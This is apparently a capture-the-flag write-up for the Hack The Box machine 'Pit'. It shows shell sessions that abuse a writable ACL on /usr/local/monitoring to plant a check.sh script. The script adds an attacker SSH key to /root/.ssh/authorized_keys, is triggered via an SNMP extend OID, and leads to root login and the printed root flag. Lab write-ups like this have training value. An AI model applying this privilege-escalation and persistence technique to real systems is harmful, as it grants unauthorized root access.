# 1. Enumeration-
```bash
[michelle@pit ~]$ ls
user.txt
[michelle@pit ~]$ ls -la
total 20
drwx------. 2 michelle michelle 129 Apr 18  2020 .
drwxr-xr-x. 3 root     root      22 Nov  3  2020 ..
lrwxrwxrwx. 1 root     root       9 May 10 10:56 .bash_history -> /dev/null
-rw-r--r--. 1 michelle michelle  18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 michelle michelle 141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 michelle michelle 312 Nov  8  2019 .bashrc
lrwxrwxrwx. 1 root     root       9 May 10 10:56 .lesshst -> /dev/null
-r--------. 1 michelle michelle  33 Jun 19 02:18 user.txt
-rw-r--r--. 1 michelle michelle 658 Mar 20  2020 .zshrc
```
### Checking out the file /usr/bin/monitor that we found from snmp enumeration-
```bash
[michelle@pit ~]$ file /usr/bin/monitor 
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
[michelle@pit ~]$ ls -la  /usr/bin/monitor 
-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
[michelle@pit ~]$ cat /usr/bin/monitor 
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit ~]$ ls -la /usr/local/monitoring/
ls: cannot open directory '/usr/local/monitoring/': Permission denied
[michelle@pit ~]$ ls -la /usr/local/
total 0
drwxr-xr-x. 13 root root 149 Nov  3  2020 .
drwxr-xr-x. 12 root root 144 May 10 05:06 ..
drwxr-xr-x.  2 root root   6 Nov  3  2020 bin
drwxr-xr-x.  2 root root   6 Nov  3  2020 etc
drwxr-xr-x.  2 root root   6 Nov  3  2020 games
drwxr-xr-x.  2 root root   6 Nov  3  2020 include
drwxr-xr-x.  2 root root   6 Nov  3  2020 lib
drwxr-xr-x.  3 root root  17 May 10 05:06 lib64
drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec
drwxrwx---+  2 root root 122 Jun 19 06:35 monitoring
drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin
drwxr-xr-x.  5 root root  49 Nov  3  2020 share
drwxr-xr-x.  2 root root   6 Nov  3  2020 src
```
### Further enumerating drwxrwx---+ permission-
```bash
[michelle@pit ~]$ getfacl /usr/local/monitoring/
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```
### We have write and execute permissions `user:michelle:-wx`,confirming it-
```bash
[michelle@pit ~]$ echo "test" > /usr/local/monitoring/demo.txt
[michelle@pit ~]$ cat /usr/local/monitoring/demo.txt
test
```
### Writing our ssh key into check.sh and copying it to /usr/local/monitoring/ -
```bash
[michelle@pit ~]$ echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmmL5+11eYuzK+n2BDL1FIh09/3yv38p706ufalDONolGLyckqHg6hjjfjKJsENs5jBXZBt2gS/UcmQGcMhvivJcikqPCl0KZ0djyajpYLYVC92gephA9fmgaMnGTds9wWB9aBH4xk/DcK1DkxLWIU054PugGiYXd/WyFCo4fZ3Z6awTPyTY47dTlASlt/YGRyhc4E2nH8dyuFlU0C8YcNUanatflhV/roMm0QPUosJx9K2AdK9ca65il1XmqjnXv08iBjV1fACXmkfpibDRXjRXUElcjPHJFspC0eCwTZD3MbLEMDZ41FeNL9aWVVKid3tvu3ckDvn2Bf45xBS72PwNvTk1zgnifbPu0J9axfD4BCNdeZeNhbaxDCDVwXMdSak7qWyGrprbOjVc6z7+0eLPFAs4HzcyFccsoDdFmf1eaf3Fz9ypvJKrTaJZpGUK7Ui0rE/ALMzqRzFeu9hoyf8iPY2dPTpO3XX/wduA4fWqsLGaZgdf5+akC8fLbJVwU= root@napster" > /root/.ssh/authorized_keys' > check.sh
[michelle@pit ~]$ cat check.sh 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmmL5+11eYuzK+n2BDL1FIh09/3yv38p706ufalDONolGLyckqHg6hjjfjKJsENs5jBXZBt2gS/UcmQGcMhvivJcikqPCl0KZ0djyajpYLYVC92gephA9fmgaMnGTds9wWB9aBH4xk/DcK1DkxLWIU054PugGiYXd/WyFCo4fZ3Z6awTPyTY47dTlASlt/YGRyhc4E2nH8dyuFlU0C8YcNUanatflhV/roMm0QPUosJx9K2AdK9ca65il1XmqjnXv08iBjV1fACXmkfpibDRXjRXUElcjPHJFspC0eCwTZD3MbLEMDZ41FeNL9aWVVKid3tvu3ckDvn2Bf45xBS72PwNvTk1zgnifbPu0J9axfD4BCNdeZeNhbaxDCDVwXMdSak7qWyGrprbOjVc6z7+0eLPFAs4HzcyFccsoDdFmf1eaf3Fz9ypvJKrTaJZpGUK7Ui0rE/ALMzqRzFeu9hoyf8iPY2dPTpO3XX/wduA4fWqsLGaZgdf5+akC8fLbJVwU= root@napster" > /root/.ssh/authorized_keys
[michelle@pit ~]$ cp check.sh /usr/local/monitoring/
[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmmL5+11eYuzK+n2BDL1FIh09/3yv38p706ufalDONolGLyckqHg6hjjfjKJsENs5jBXZBt2gS/UcmQGcMhvivJcikqPCl0KZ0djyajpYLYVC92gephA9fmgaMnGTds9wWB9aBH4xk/DcK1DkxLWIU054PugGiYXd/WyFCo4fZ3Z6awTPyTY47dTlASlt/YGRyhc4E2nH8dyuFlU0C8YcNUanatflhV/roMm0QPUosJx9K2AdK9ca65il1XmqjnXv08iBjV1fACXmkfpibDRXjRXUElcjPHJFspC0eCwTZD3MbLEMDZ41FeNL9aWVVKid3tvu3ckDvn2Bf45xBS72PwNvTk1zgnifbPu0J9axfD4BCNdeZeNhbaxDCDVwXMdSak7qWyGrprbOjVc6z7+0eLPFAs4HzcyFccsoDdFmf1eaf3Fz9ypvJKrTaJZpGUK7Ui0rE/ALMzqRzFeu9hoyf8iPY2dPTpO3XX/wduA4fWqsLGaZgdf5+akC8fLbJVwU= root@napster" > /root/.ssh/authorized_keys
```

### Executing it via Snmp-

```bash
root@napster:~/Documents/HTB/Pit# snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
```

# 2. Root.txt-
```bash
root@napster:~/.ssh# ssh root@pit.htb
Web console: https://pit.htb:9090/

Last login: Mon May 10 11:42:46 2021
[root@pit ~]# ls -la
total 28
dr-xr-x---.  5 root root 225 May 10 11:07 .
drwxr-xr-x. 17 root root 224 May 10 10:56 ..
lrwxrwxrwx.  1 root root   9 May 10 10:56 .bash_history -> /dev/null
-rw-r--r--.  1 root root  18 May 11  2019 .bash_logout
-rw-r--r--.  1 root root 176 May 11  2019 .bash_profile
-rw-r--r--.  1 root root 176 May 11  2019 .bashrc
-rwx------.  1 root root 706 Apr 22  2020 cleanup.sh
drwx------.  3 root root  20 Apr 17  2020 .config
-rw-r--r--.  1 root root 100 May 11  2019 .cshrc
drwx------.  2 root root 122 Apr 18  2020 monitoring
lrwxrwxrwx.  1 root root   9 May 10 10:56 .mysql_history -> /dev/null
lrwxrwxrwx.  1 root root   9 May 10 11:07 null -> /dev/null
-r--------.  1 root root  33 Jun 19 02:18 root.txt
drwx------.  2 root root  29 Apr 18  2020 .ssh
-rw-r--r--.  1 root root 129 May 11  2019 .tcshrc
[root@pit ~]# cat root.txt 
69e67be09e9194eb2aa1ed80663404bc
```